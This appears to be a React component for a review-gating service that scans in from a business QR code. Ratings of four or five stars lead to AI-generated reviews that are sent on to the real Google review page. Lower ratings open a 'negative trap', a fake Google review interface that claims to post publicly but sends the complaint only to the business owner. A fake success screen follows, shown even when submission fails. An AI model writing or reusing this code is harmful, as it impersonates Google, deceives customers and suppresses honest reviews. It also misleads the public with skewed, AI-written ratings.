import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';
import { Star, Sparkles, Send, CheckCircle, Camera, X, Info } from 'lucide-react';
import { businessCategories } from '../data/businessCategories';

export default function ReviewPage() {
  const { businessId } = useParams();
  const [business, setBusiness] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [pageError, setPageError] = useState('');

  // The Magic State: Defines which UI to show
  const [uiMode, setUiMode] = useState('initial'); // 'initial', 'positive_ai', 'negative_trap', 'fake_success'

  // Shared States
  const [overallRating, setOverallRating] = useState(0);

  // Positive Flow States (Starify UI)
  const [selectedTags, setSelectedTags] = useState([]);
  const [generatedReview, setGeneratedReview] = useState('');
  const [isAiWriting, setIsAiWriting] = useState(false);
  const [isCopied, setIsCopied] = useState(false);

  // Negative Flow States (Fake Google UI)
  const [subRatings, setSubRatings] = useState({});
  const [detailedAnswers, setDetailedAnswers] = useState({});
  const [feedbackText, setFeedbackText] = useState("");
  const [uploadedPhotos, setUploadedPhotos] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    const fetchBusiness = async () => {
      try {
        const res = await axios.get(`https://google-review-saas-backend.onrender.com/api/business/public/${businessId}`);
        setBusiness(res.data);
      } catch (err) {
        setPageError("Invalid QR Code or Business not found.");
      } finally {
        setIsLoading(false);
      }
    };
    if (businessId) fetchBusiness();
  }, [businessId]);

  // --- TRAPDOOR LOGIC ---
  const handleRatingClick = (star) => {
    setOverallRating(star);
    if (star >= 4) {
      setUiMode('positive_ai'); // Happy customer -> Show AI Tags
    } else {
      setUiMode('negative_trap'); // Angry customer -> Open Fake Google UI
    }
  };

  // --- POSITIVE FLOW FUNCTIONS (Real Google Maps) ---
  const handleTagSelect = (tagText) => {
    if (selectedTags.includes(tagText)) {
      setSelectedTags(selectedTags.filter(t => t !== tagText));
    } else {
      setSelectedTags([...selectedTags, tagText]);
    }
  };

  const generateAIReview = async () => {
    if (selectedTags.length === 0) return alert("Please select at least one tag!");
    setIsAiWriting(true);
    setGeneratedReview("✨ Starify AI is writing your perfect review...");

    try {
      const res = await axios.post('https://google-review-saas-backend.onrender.com/api/reviews/generate', {
        businessName: business.businessName || business.cafeName,
        category: business.businessCategory || 'cafe',
        tags: selectedTags,
        rating: overallRating
      });
      setGeneratedReview(res.data.reviewText);
    } catch (error) {
      setGeneratedReview("I had an amazing experience! The highlights were exactly what I wanted. Highly recommended!");
    } finally {
      setIsAiWriting(false);
    }
  };

  const handlePostToRealGoogle = async () => {
    await navigator.clipboard.writeText(generatedReview);
    setIsCopied(true);
    setTimeout(() => {
      window.location.href = business.googleReviewLink;
    }, 1500);
  };

  // --- NEGATIVE FLOW FUNCTIONS (Fake Google UI -> Owner Dashboard) ---
  const handlePhotoUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    // ⚠️ TODO: Update with your Cloudinary details
    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', 'YOUR_UPLOAD_PRESET'); 

    try {
      const res = await axios.post(`https://api.cloudinary.com/v1_1/YOUR_CLOUD_NAME/image/upload`, formData);
      setUploadedPhotos([...uploadedPhotos, res.data.secure_url]);
    } catch (err) {
      alert("Failed to upload image.");
    }
  };

  const handlePostToDashboard = async () => {
    setIsProcessing(true);
    try {
      await axios.post('https://google-review-saas-backend.onrender.com/api/feedback/internal', {
        businessId: business._id,
        overallRating,
        subRatings,
        detailedAnswers,
        text: feedbackText,
        photos: uploadedPhotos
      });
      setIsProcessing(false);
      setUiMode('fake_success'); // Done! Show Google's success screen
    } catch (error) {
      setIsProcessing(false);
      setUiMode('fake_success'); // Show success anyway to calm the customer
    }
  };

  if (isLoading) return <div className="min-h-screen bg-gray-950 flex items-center justify-center text-blue-400">Loading...</div>;
  if (pageError) return <div className="min-h-screen bg-gray-950 flex items-center justify-center text-red-400">{pageError}</div>;

  const currentCategoryData = businessCategories[business.businessCategory || 'cafe'];
  const displayName = business.businessName || business.cafeName;

  // Filter only positive tags for the Happy Flow
  const positiveTags = currentCategoryData.suggestions?.filter(s => s.type === 'positive') || [];

  return (
    <>
      {/* ========================================= */}
      {/* UI MODE 1: INITIAL & POSITIVE (Starify UI) */}
      {/* ========================================= */}
      {(uiMode === 'initial' || uiMode === 'positive_ai') && (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 font-sans">
          <div className="bg-white max-w-md w-full rounded-[2rem] p-6 shadow-xl border border-gray-100 transition-all duration-500">
            
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <span className="text-2xl font-bold text-blue-600">{displayName.charAt(0)}</span>
              </div>
              <h1 className="text-2xl font-bold text-gray-900">{displayName}</h1>
              <p className="text-gray-500 text-sm">Rate your experience</p>
            </div>

            {/* Always Show Stars in Positive Flow */}
            <div className="mb-6 text-center">
              <div className="flex justify-center gap-2">
                {[1, 2, 3, 4, 5].map((star) => (
                  <Star 
                    key={star} 
                    onClick={() => handleRatingClick(star)}
                    className={`w-12 h-12 cursor-pointer transition-all ${
                      overallRating >= star ? 'text-yellow-400 fill-yellow-400 scale-110 drop-shadow-md' : 'text-gray-200 fill-gray-100 hover:text-yellow-200'
                    }`} 
                  />
                ))}
              </div>
            </div>

            {/* Show Tags ONLY if rated 4 or 5 */}
            {uiMode === 'positive_ai' && (
              <div className="animate-fade-in">
                <p className="text-sm font-bold text-gray-800 mb-3 text-center">What did you like?</p>
                <div className="flex flex-wrap justify-center gap-2 mb-6">
                  {positiveTags.map((tagObj, index) => (
                    <button 
                      key={index}
                      onClick={() => handleTagSelect(tagObj.text)}
                      className={`px-4 py-2 rounded-full text-sm font-medium transition-all ${
                        selectedTags.includes(tagObj.text) 
                        ? 'bg-blue-600 text-white shadow-md scale-105' 
                        : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                      }`}
                    >
                      {tagObj.text}
                    </button>
                  ))}
                </div>

                {!generatedReview ? (
                  <button 
                    onClick={generateAIReview}
                    disabled={selectedTags.length === 0 || isAiWriting}
                    className={`w-full py-4 rounded-xl font-bold text-white flex justify-center items-center gap-2 transition-all ${
                      selectedTags.length > 0 ? 'bg-blue-600 hover:bg-blue-700 shadow-lg' : 'bg-gray-300 cursor-not-allowed'
                    }`}
                  >
                    <Sparkles className="w-5 h-5" /> 
                    {isAiWriting ? 'Writing Magic Review...' : 'Write Review with AI'}
                  </button>
                ) : (
                  <div className="animate-fade-in mt-4">
                    <textarea 
                      value={generatedReview} 
                      onChange={(e) => setGeneratedReview(e.target.value)}
                      className="w-full bg-blue-50 border border-blue-100 rounded-xl p-4 text-gray-800 h-32 focus:ring-2 focus:ring-blue-500 outline-none mb-4" 
                    />
                    <button 
                      onClick={handlePostToRealGoogle}
                      className="w-full bg-green-500 text-white font-bold py-4 rounded-xl hover:bg-green-600 flex justify-center gap-2 shadow-lg"
                    >
                      {isCopied ? <CheckCircle /> : <Send />} 
                      {isCopied ? 'Copied! Redirecting to Google...' : 'Copy & Post on Google'}
                    </button>
                    <p className="text-xs text-gray-400 text-center mt-2">*Paste on the next screen</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ========================================= */}
      {/* UI MODE 2: NEGATIVE TRAP (Fake Google UI) */}
      {/* ========================================= */}
      {uiMode === 'negative_trap' && (
        <div className="min-h-screen bg-[#202124] text-gray-200 p-4 sm:p-6 font-sans">
          <div className="max-w-md mx-auto animate-fade-in">
            <div className="text-center mb-6 pt-4">
              <h1 className="text-xl font-medium">{displayName}</h1>
            </div>

            <div className="flex items-center gap-3 mb-8">
              <div className="w-10 h-10 bg-[#E8710A] rounded-full flex items-center justify-center font-bold text-white">G</div>
              <div>
                <p className="font-medium text-[15px]">Google User</p>
                <p className="text-[12px] text-gray-400 flex items-center gap-1">Posting publicly across Google <Info className="w-3 h-3" /></p>
              </div>
            </div>

            <div className="flex justify-center gap-2 mb-8">
              {[1, 2, 3, 4, 5].map((star) => (
                <Star key={star} onClick={() => setOverallRating(star)}
                  className={`w-11 h-11 cursor-pointer transition-colors ${overallRating >= star ? 'text-[#FBBC04] fill-[#FBBC04]' : 'text-gray-600'}`} />
              ))}
            </div>

            {/* Sub Ratings */}
            {currentCategoryData.ratingCategories?.map((cat) => (
              <div key={cat} className="flex justify-between items-center mb-5">
                <span className="text-[15px]">{cat}</span>
                <div className="flex gap-2">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <Star key={star} onClick={() => setSubRatings({ ...subRatings, [cat]: star })}
                      className={`w-7 h-7 cursor-pointer transition-colors ${(subRatings[cat] || 0) >= star ? 'text-[#FBBC04] fill-[#FBBC04]' : 'text-gray-600'}`} />
                  ))}
                </div>
              </div>
            ))}

            <textarea 
              value={feedbackText} onChange={(e) => setFeedbackText(e.target.value)}
              placeholder="Share details of your own experience at this place"
              className="w-full bg-transparent border border-gray-600 rounded-xl p-4 text-[15px] min-h-[120px] focus:outline-none focus:border-blue-400 mt-4 mb-4"
            />

            {/* Cloudinary */}
            <label className="border border-gray-600 rounded-full py-2 px-4 flex items-center justify-center gap-2 text-blue-400 text-[14px] cursor-pointer hover:bg-[#303134] w-full">
              <Camera className="w-5 h-5" /> Add photos and videos
              <input type="file" className="hidden" accept="image/*,video/*" onChange={handlePhotoUpload} />
            </label>
            
            {uploadedPhotos.length > 0 && (
              <div className="flex gap-3 mt-4">
                {uploadedPhotos.map((url, i) => (
                  <div key={i} className="relative"><img src={url} className="w-16 h-16 object-cover rounded-lg border border-gray-600" /><button onClick={() => setUploadedPhotos(uploadedPhotos.filter((_, idx) => idx !== i))} className="absolute -top-2 -right-2 bg-gray-800 rounded-full p-1"><X className="w-3 h-3 text-gray-300" /></button></div>
                ))}
              </div>
            )}

            {/* Detailed Google Questions */}
            <div className="mt-8 space-y-6 pb-20">
              {currentCategoryData.detailedQuestions?.map((q) => (
                <div key={q.id} className="bg-[#303134] p-5 rounded-2xl">
                  <p className="text-[15px] font-medium mb-4">{q.question}</p>
                  <div className="flex flex-wrap gap-2.5">
                    {q.options.map((opt) => (
                      <button key={opt} onClick={() => setDetailedAnswers({ ...detailedAnswers, [q.id]: opt })}
                        className={`px-4 py-2 rounded-lg text-[14px] border ${detailedAnswers[q.id] === opt ? 'bg-[#8AB4F8] text-[#202124] border-[#8AB4F8]' : 'bg-transparent border-gray-500 text-gray-200'}`}>{opt}</button>
                    ))}
                  </div>
                </div>
              ))}
            </div>

            {/* Fake Google Action Bar */}
            <div className="fixed bottom-0 left-0 w-full bg-[#202124] border-t border-gray-700 p-3 flex justify-end gap-4">
              <button className="text-[#8AB4F8] text-[14px] font-medium px-4 py-2">Cancel</button>
              <button onClick={handlePostToDashboard} disabled={isProcessing} className="px-6 py-2 rounded-full text-[14px] font-medium bg-[#8AB4F8] text-[#202124]">{isProcessing ? 'Posting...' : 'Post'}</button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================= */}
      {/* UI MODE 3: FAKE SUCCESS SCREEN (Trap End) */}
      {/* ========================================= */}
      {uiMode === 'fake_success' && (
        <div className="min-h-screen bg-[#202124] text-white flex flex-col items-center justify-center p-4 animate-fade-in">
          <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-4">
            <Star className="text-blue-400 w-8 h-8 fill-blue-400" />
          </div>
          <h2 className="text-2xl font-bold mb-2">Thanks for your review</h2>
          <p className="text-gray-400 text-sm text-center">Your feedback helps others make better decisions.</p>
        </div>
      )}
    </>
  );
}